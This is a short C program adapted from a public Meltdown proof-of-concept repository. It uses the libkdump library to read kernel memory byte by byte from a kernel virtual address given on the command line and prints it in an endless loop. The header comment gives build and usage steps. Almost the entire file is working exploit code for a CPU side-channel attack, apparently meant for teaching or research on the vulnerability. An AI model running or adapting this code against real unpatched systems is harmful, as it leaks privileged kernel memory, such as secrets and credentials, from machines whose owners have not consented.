
/************************************************************************
 * this program is a variation of the physical_reader.c program
 * avalable at the Git repo https://github.com/IAIK/meltdown
 *
 * this program uses the libkdump library availabl at that repo
 *
 * to use this program you should clone the repo and store the program in the meltdown directory 
 *
 * after you can type make
 *
 * an executable with the same name of this source file (but no .c extension) will be generated
 *
 * you can start it providing a kernel level virtual address
 *
 * *********************************************************************/




#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>

#define KERNEL_BOUNDARY 0xffffffff00000000

int main(int argc, char *argv[]) {
  size_t vaddr;
  if (argc < 2) {
    printf("Usage: %s <virtual address>\n", argv[0]);
    return 0;
  }

  vaddr = strtoull(argv[1], NULL, 0);

  if (vaddr < KERNEL_BOUNDARY){
    printf("You should provide a kernel address!\n");
    return 0;
  }

  libkdump_config_t config;
  config = libkdump_get_autoconfig();

  libkdump_init(config);

  vaddr = strtoull(argv[1], NULL, 0);
  while (1) {
    int value = libkdump_read(vaddr);
    printf("%c", value);
    fflush(stdout);
    vaddr++;
  }

  libkdump_cleanup();

  return 0;
}
